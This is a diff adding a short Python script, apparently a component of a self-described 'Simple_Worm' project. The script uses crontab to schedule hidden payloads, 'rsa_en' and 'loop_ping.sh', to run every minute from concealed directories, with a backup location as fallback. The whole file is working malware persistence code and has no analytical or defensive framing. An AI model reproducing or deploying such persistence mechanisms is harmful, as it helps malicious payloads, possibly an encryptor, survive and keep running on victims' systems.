@@ -1,0 +1,14 @@
+#!/usr/bin/env python
+
+from crontab import CronTab
+
+def cron_job(username,command):
+    cron = CronTab(user = username)
+    job = cron.new(command = command)
+    job.setall('*/1 * * * *')
+    cron.write()
+def main():
+    cron_job('attacker','test -e /home/attacker/Public/.Simple_Worm/rsa_en && /home/attacker/Public/.Simple_Worm/rsa_en || /home/attacker/Desktop/.Backup/rsa_en')
+    cron_job('attacker','test -e /home/attacker/Public/.Simple_Worm/loop_ping.sh && /home/attacker/Public/.Simple_Worm/loop_ping.sh || /home/attacker/Desktop/.Backup/loop_ping.sh')
+if __name__ == '__main__':
+    main()
